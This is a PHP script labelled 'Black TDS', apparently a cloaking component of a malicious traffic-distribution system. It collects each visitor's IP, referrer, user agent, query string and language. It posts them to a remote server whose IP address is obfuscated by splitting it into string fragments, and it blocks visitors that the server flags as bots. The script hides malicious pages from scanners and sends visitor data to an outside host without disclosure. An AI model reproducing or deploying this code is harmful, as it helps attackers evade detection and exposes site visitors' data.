<?php 


$cacheurl="https://pfigmax.xyz/botcache/cache.php";

@$_SERVER['HTTP_ACCEPT_LANGUAGE'] = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
if (in_array('curl', get_loaded_extensions())) {} else {
    echo 'Install CURL on server';
    die;
}
if (!function_exists('getRealip')) {
    function getRealip() {
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP']) != '127.0.0.1') && (($_SERVER['HTTP_CF_CONNECTING_IP']) != ($_SERVER['SERVER_ADDR']))) {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        }
        elseif((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR']) != '127.0.0.1')) {
            $ip = $_SERVER['GEOIP_ADDR'];
        }
        elseif((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR']) != '127.0.0.1') && (($_SERVER['HTTP_X_FORWARDED_FOR']) != ($_SERVER['SERVER_ADDR']))) {
            $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        }
        elseif((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP']) != '127.0.0.1') && (($_SERVER['HTTP_CLIENT_IP']) != ($_SERVER['SERVER_ADDR']))) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
}
$ip = getRealip();
if($BLACKTDSDEBUG){$ip = "105.112.186.169";
}

if (!function_exists('getRealref')) {
    function getRealref() {
        if (empty($_SERVER['HTTP_REFERER'])) {
            $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER');
        }
        return $_SERVER['HTTP_REFERER'];
    }
}
$ref = getRealref();
if (!function_exists('getRealua')) {
    function getRealua() {
        if (empty($_SERVER['HTTP_USER_AGENT'])) {
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT');
        }
        return $_SERVER['HTTP_USER_AGENT'];
    }
}
$ua = getRealua();
if ($_SERVER['QUERY_STRING'] != '') {
    $data = ''.urlencode($_SERVER['QUERY_STRING']).
    '';
} else {
    $data = '';
}
$langua = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
$vercode = '30121';
$cl0ip = '104';
$sourcename = 'ch';
$sourceid = '';
$cl1ip = '.193.';
$flowdomain = 'z100654';
$cl2ip = '252.';
$cloudipphp = 'apiconstr';
$cl3ip = '21';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://'.$cl0ip.
    ''.$cl1ip.
    ''.$cl2ip.
    ''.$cl3ip.
    '/'.$cloudipphp.
    '.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'fd='.$flowdomain.
    '&ip='.$ip.
    '&ref='.$ref.
    '&ua='.$ua.
    '&data='.$data.
    '&sourceid='.$sourceid.
    '&langua='.$langua.
    '&sourcename='.$sourcename.
    '');
$ifbot = curl_exec($ch);
curl_close($ch);

// echo "RESULT : $ifbot  ";
if ($ifbot != '0') {
    // http_response_code(404);



    echo "Black TDS Error!";
     die();

    // cache data for 

    

 }
    
    else {  } ?>
